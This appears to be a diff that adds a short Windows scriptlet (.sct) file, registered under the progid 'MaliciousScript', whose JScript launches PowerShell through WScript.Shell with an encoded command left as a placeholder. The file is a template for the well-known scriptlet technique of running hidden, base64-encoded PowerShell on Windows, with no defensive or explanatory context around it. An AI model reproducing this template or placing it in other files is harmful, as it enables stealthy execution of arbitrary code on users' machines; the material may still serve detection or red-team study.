@@ -1,0 +1,7 @@
+<?XML version="1.0"?>
+<scriptlet>
+  <registration progid="MaliciousScript" classid="{A1112221-AAAA-1234-5678-000000000000}" />
+  <script language="JScript">
+    new ActiveXObject("WScript.Shell").Exec("powershell -eC <base64_encoded_command>");
+  </script>
+</scriptlet>
